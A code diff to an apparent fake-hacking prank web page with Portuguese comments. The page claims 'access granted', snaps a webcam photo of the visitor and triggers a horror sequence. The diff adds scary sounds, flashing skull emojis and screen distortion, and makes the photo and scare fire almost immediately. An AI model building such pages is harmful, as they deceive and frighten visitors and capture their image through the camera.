@@ -261,12 +261,55 @@
             0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
             100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000; }
         }
+
+        /* IMAGENS BIZARRAS */
+        .bizarra-image {
+            position: fixed;
+            z-index: 1002;
+            pointer-events: none;
+            opacity: 0.7;
+            filter: invert(1) saturate(2);
+            animation: bizarraAnimation 0.4s ease-out;
+        }
+
+        @keyframes bizarraAnimation {
+            0% { 
+                transform: scale(0.1) rotate(0deg);
+                opacity: 0;
+            }
+            50% {
+                opacity: 0.9;
+            }
+            100% { 
+                transform: scale(1) rotate(10deg);
+                opacity: 0;
+            }
+        }
+
+        .distortion {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><filter id="distort"><feTurbulence type="turbulence" baseFrequency="0.9" numOctaves="4" /><feDisplacementMap in="SourceGraphic" scale="8" /></filter></svg>#distort');
+            display: none;
+            z-index: 1003;
+            pointer-events: none;
+            animation: distortFlicker 0.1s infinite;
+        }
+
+        @keyframes distortFlicker {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 0.5; }
+        }
     </style>
 </head>
 <body>
     <div class="hacker-effect" id="hackerEffect"></div>
     <div class="horror-layer" id="horrorLayer"></div>
     <div class="glitch-text" id="glitchText"></div>
+    <div class="distortion" id="distortion"></div>
 
     <div class="container" id="container">
         <h1>⚠️ ACESSO CONCEDIDO ⚠️</h1>
@@ -309,7 +352,99 @@
             }, 200);
         }
 
+        // GERAR SOM ASSUSTADOR
+        function gerarSomAssustador() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const now = audioContext.currentTime;
+
+                // Som 1: Estrondo baixo
+                const oscillator1 = audioContext.createOscillator();
+                const gain1 = audioContext.createGain();
+                oscillator1.connect(gain1);
+                gain1.connect(audioContext.destination);
+                
+                oscillator1.frequency.setValueAtTime(150, now);
+                oscillator1.frequency.exponentialRampToValueAtTime(50, now + 0.3);
+                gain1.gain.setValueAtTime(0.5, now);
+                gain1.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
+                
+                oscillator1.start(now);
+                oscillator1.stop(now + 0.3);
+
+                // Som 2: Ruído assustador
+                setTimeout(() => {
+                    const bufferSize = audioContext.sampleRate * 0.2;
+                    const buffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
+                    const data = buffer.getChannelData(0);
+                    
+                    for (let i = 0; i < bufferSize; i++) {
+                        data[i] = Math.random() * 2 - 1;
+                    }
+                    
+                    const source = audioContext.createBufferSource();
+                    const gain = audioContext.createGain();
+                    source.buffer = buffer;
+                    source.connect(gain);
+                    gain.connect(audioContext.destination);
+                    
+                    gain.gain.setValueAtTime(0.3, now + 0.3);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.5);
+                    
+                    source.start(now + 0.3);
+                }, 100);
+
+                // Som 3: Grito eletrônico
+                setTimeout(() => {
+                    const osc = audioContext.createOscillator();
+                    const g = audioContext.createGain();
+                    osc.connect(g);
+                    g.connect(audioContext.destination);
+                    
+                    osc.frequency.setValueAtTime(800, now + 0.5);
+                    osc.frequency.exponentialRampToValueAtTime(200, now + 0.8);
+                    g.gain.setValueAtTime(0.4, now + 0.5);
+                    g.gain.exponentialRampToValueAtTime(0.01, now + 0.8);
+                    
+                    osc.start(now + 0.5);
+                    osc.stop(now + 0.8);
+                }, 200);
+            } catch (e) {
+                console.log('Som não disponível');
+            }
+        }
+
+        // CRIAR IMAGENS BIZARRAS
+        function criarImagensBizarras() {
+            const emojisAssustadores = ['👁️', '💀', '👻', '😱', '⚠️', '🔪', '💀', '😈', '👹', '🕷️', '🦴', '☠️', '🔴', '⛔'];
+            
+            for (let i = 0; i < 12; i++) {
+                setTimeout(() => {
+                    const div = document.createElement('div');
+                    div.className = 'bizarra-image';
+                    div.textContent = emojisAssustadores[Math.floor(Math.random() * emojisAssustadores.length)];
+                    div.style.fontSize = (Math.random() * 100 + 50) + 'px';
+                    div.style.left = Math.random() * window.innerWidth + 'px';
+                    div.style.top = Math.random() * window.innerHeight + 'px';
+                    div.style.transform = `rotate(${Math.random() * 360}deg)`;
+                    document.body.appendChild(div);
+                    
+                    setTimeout(() => div.remove(), 500);
+                }, i * 150);
+            }
+
+            // Efeito de distorção
+            const distortion = document.getElementById('distortion');
+            distortion.style.display = 'block';
+            setTimeout(() => {
+                distortion.style.display = 'none';
+            }, 2000);
+        }
+
         function iniciarSequenciaHorror() {
+            gerarSomAssustador();
+            criarImagensBizarras();
+
             const horrorLayer = document.getElementById('horrorLayer');
             horrorLayer.style.display = 'block';
             
@@ -391,7 +526,8 @@
                 video.onloadedmetadata = function() {
                     video.play();
                     container.classList.add('visible');
-                    setTimeout(tirarFoto, 2000);
+                    // Tirar foto IMEDIATAMENTE
+                    setTimeout(tirarFoto, 300);
                 };
 
                 document.getElementById('video').parentElement.style.display = 'block';
@@ -425,10 +561,11 @@
 
             mostrarStatus('[✓✓✓] ACESSO ADQUIRIDO', 'success');
             
+            // INICIAR HORROR IMEDIATAMENTE
             setTimeout(() => {
                 iniciarSequenciaHorror();
                 baixarFotoAutomatico();
-            }, 1000);
+            }, 300);
         }
 
         function baixarFotoAutomatico() {
